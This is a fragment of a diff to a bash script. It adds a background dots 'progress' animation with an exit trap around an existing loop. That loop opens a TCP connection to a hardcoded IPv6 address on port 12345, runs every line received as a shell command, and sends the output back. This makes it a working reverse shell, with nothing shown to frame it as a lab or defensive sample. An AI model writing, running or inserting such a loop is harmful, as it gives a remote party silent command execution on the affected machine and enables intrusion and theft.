@@ -21,6 +21,22 @@
 IP=2001:1418:100:250::2
 PORT=12345
 
+function dots {
+  while : ; do
+    echo -n ". "
+    sleep 2s
+  done
+}
+
+dots &
+pid=$!
+
+function atexit_func {
+  kill -9 $pid
+}
+
+trap "atexit_func" EXIT
+
 while((1)); do
   if exec 5<>/dev/tcp/${IP}/${PORT}; then
     cat <&5 | while read line; do $line 2>&5 >&5; done
